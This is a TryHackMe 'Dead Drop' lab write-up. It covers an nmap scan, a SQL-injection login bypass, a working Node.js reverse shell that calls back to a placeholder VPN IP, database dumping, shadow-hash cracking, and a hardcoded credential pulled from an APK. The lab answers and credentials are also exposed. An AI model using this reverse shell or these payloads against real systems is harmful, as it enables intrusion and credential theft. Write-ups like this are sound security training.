<img width="1345" height="156" alt="image" src="https://github.com/user-attachments/assets/69ef9e33-4a88-4a59-9899-73a08e5662f6" /><img width="1772" height="247" alt="image" src="https://github.com/user-attachments/assets/fcffbf65-62f0-49d6-9f53-0e5359c59b17" />

# TryHackMe - Dead Drop Write-up

<img width="992" height="587" alt="image" src="https://github.com/user-attachments/assets/c4127afc-66a3-429e-a96a-23615e9bc7c4" />

<br>


Web server / DMZ: directly accessible from VPN
Internal LAN: 192.168.11.0/24

`Internal hosts shown:
DEADDROP-DC → 192.168.11.100
DEADDROP-WRK → 192.168.11.51
WebServer → 192.168.11.200`

So first goal: compromise the web server and get SSH creds.

### Start with nmap:

```nmap -sC -sV -Pn -oN deaddrop-web.nmap 192.168.11.200```

<img width="1349" height="416" alt="image" src="https://github.com/user-attachments/assets/9812f013-dc88-48ae-b0c4-e03dfce32528" />
<br>

Web server is simple:

```
22 SSH
80 Node.js Express app
/login
```

So first target is the Node.js. SSH password likely comes from web exploit/leak. 🧭

In browser, open:
```
http://192.168.11.200/login
```

<img width="1358" height="864" alt="image" src="https://github.com/user-attachments/assets/11b6d74a-1f4a-45bc-9428-47d8771b9794" />
<br>

Then test common auth bypasses:

Payload used:
```
username=admin'--&password=x
```
<img width="1370" height="856" alt="image" src="https://github.com/user-attachments/assets/55dca5c1-8e63-4a96-aa8f-fa6f78451cc4" />

<img width="1898" height="863" alt="image" src="https://github.com/user-attachments/assets/d4bcc6a1-fad1-4760-8cbf-edfa840c107c" />

<br>

That confirms SQL injection login bypass worked ✅

Meaning the backend query is probably something like:

```
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'
```

The `--` comments out the password check, so you are logged in as admin.

## Notes on Testing

I also tested a few other possibilities before finding the working path. Path traversal in the preview and rename functions did not work because the application appeared to sanitize filenames and strip directory traversal characters. SSTI payloads were also displayed as plain text, so the preview page was not evaluating template syntax.

Since the server was running Node.js Express, this helped narrow the path toward using a Node.js reverse shell payload instead.

## Getting a Reverse Shell

While checking the uploaded files, I noticed there was already a JavaScript reverse shell file in the file manager. This was a useful hint that JavaScript files might be executed by the preview function. Instead of using the existing file directly, I used my own `rev.js` payload with my VPN IP and listener port.

For a Node.js reverse shell, create rev.js with your VPN IP:

```
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4444, "YOUR_VPN_IP", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
})();
```

Start a Listener:

```bash
nc -lvnp 4444
```

I then uploaded rev.js through the file manager. After the file appeared in the dashboard, I clicked Preview on the uploaded file. This triggered the JavaScript file on the server side and caused the target to connect back to my listener.

Once the connection came in, I confirmed the shell:

<img width="1346" height="158" alt="image" src="https://github.com/user-attachments/assets/9d0ab6bc-bb64-408e-8103-62542425a740" />

<br>

```bash
whoami
```
The shell was running as the node user, which confirmed code execution through the uploaded Node.js reverse shell.

<img width="1349" height="506" alt="image" src="https://github.com/user-attachments/assets/af4a5fb2-9f17-45bb-b6d8-78863a9afc26" />

<img width="1357" height="224" alt="image" src="https://github.com/user-attachments/assets/fad27f82-de1e-496e-aa4a-2ea7710ba47e" />

<br>

sqlite3 is not installed on the target, but that’s okay. You have a few easy options.

first run 
```
cat package.json
```
— that will tell us the exact DB library.

<img width="1348" height="468" alt="image" src="https://github.com/user-attachments/assets/48e16bfd-727e-491d-9915-98931306b793" />

<br>

It uses better-sqlite3, not sqlite3.

Run this from `/opt/app`:

```bash
node -e "const Database=require('better-sqlite3'); const db=new Database('./db/deaddrop.db'); console.log(db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all());"
```

Then dump all tables automatically:

```bash
node -e "const Database=require('better-sqlite3'); const db=new Database('./db/deaddrop.db'); const tables=db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all().map(x=>x.name); for (const t of tables){ console.log('\n### '+t); console.log(db.prepare('SELECT * FROM '+t).all()); }"
```

<img width="1358" height="374" alt="image" src="https://github.com/user-attachments/assets/3ec5da98-3eee-4851-856f-f7003d0f49b8" />

<br>

Turned out these DB creds don’t work for SSH, they are probably web app creds only. The SSH password answer is somewhere else.

So I went back to the rev shell and found a file that is very sus: `shadow.bak`

<img width="1350" height="246" alt="image" src="https://github.com/user-attachments/assets/92c71880-e8a7-4baf-9924-19bb386be57d" />

That’s a Linux shadow hash for svc-drop. $6$ means SHA-512 crypt, usually John can crack it.

Hash Cracking time:

<img width="1344" height="252" alt="image" src="https://github.com/user-attachments/assets/dd83ca1b-2435-47ee-98fb-c9412f51cb11" />

Niceee 🔥 First answer confirmed.

Next, continue from the svc-drop SSH shell.

<img width="1350" height="435" alt="image" src="https://github.com/user-attachments/assets/38bfb9b0-52fb-4442-8ab8-58d5ec087f55" />

There was a apk file, it is likely the answer for second question. I transferred the APK to my Kali machine using scp.

From Kali, pull it over SSH. Password is the one you cracked.

```
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
```

To inspect the application, I opened the APK with jadx-gui:

`jadx-gui deaddrop-mobile.apk`

<img width="1599" height="822" alt="image" src="https://github.com/user-attachments/assets/de126ae9-24e1-4c4e-a822-c7dfc1070203" />
<br>

Inside JADX, I searched for keywords such as username, password, login, and auth. The application contained hardcoded credentials, which were used later for Active Directory access:

j.harris:DropsOfJupiter2026!
